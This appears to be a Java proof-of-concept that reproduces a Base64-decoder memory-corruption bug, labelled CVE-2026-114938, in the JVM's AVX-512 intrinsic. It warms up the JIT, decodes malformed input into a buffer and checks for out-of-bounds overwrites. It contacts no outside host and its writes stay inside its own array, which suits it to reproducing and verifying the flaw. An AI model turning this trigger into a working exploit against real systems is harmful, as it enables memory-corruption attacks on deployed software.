import java.nio.charset.StandardCharsets;
import java.util.Arrays;
import java.util.Base64;

/**
 * Bounded standalone trigger for CVE-2026-114938.
 *
 * Warms the decoder until the AVX-512 intrinsic is used, then decodes the
 * malformed tail into a 4096-byte array. Every write stays inside a real
 * array, so the trigger is safe to run on an authorized host. Prints
 * "REPRODUCED" when 62 bytes at offsets 50..111 are overwritten.
 */
public final class Base64Trigger {
    private static volatile int sink;

    public static void main(String[] args) {
        Base64.Decoder decoder = Base64.getDecoder();
        int length = Runtime.version().feature() == 17 ? 128 : 64;
        int outputEnd = length / 4 * 3 + 2;
        byte[] valid = "A".repeat(length).getBytes(StandardCharsets.US_ASCII);
        byte[] malformed = ("A".repeat(length) + "=").getBytes(StandardCharsets.US_ASCII);
        byte[] target = new byte[4096];

        // Warm up the JIT so C2 compiles the Base64 intrinsic (AVX-512 path).
        for (int i = 0; i < 200_000; i++) {
            sink += decoder.decode(valid, target);
        }

        Arrays.fill(target, (byte) 0x5a);
        boolean rejected = false;
        try {
            decoder.decode(malformed, target);
        } catch (IllegalArgumentException expected) {
            rejected = true;
        }

        int changed = 0;
        int first = -1;
        int last = -1;
        for (int i = outputEnd; i < target.length; i++) {
            if (target[i] != (byte) 0x5a) {
                changed++;
                if (first < 0) first = i;
                last = i;
            }
        }

        System.out.println("runtime=" + System.getProperty("java.runtime.version"));
        System.out.println("vm=" + System.getProperty("java.vm.name"));
        System.out.printf("rejected=%s changed=%d first=%d last=%d%n",
            rejected, changed, first, last);

        if (!rejected || changed != 62 || first != outputEnd || last != outputEnd + 61) {
            System.err.println("NOT REPRODUCED");
            System.exit(1);
        }
        System.out.println("REPRODUCED");
    }
}
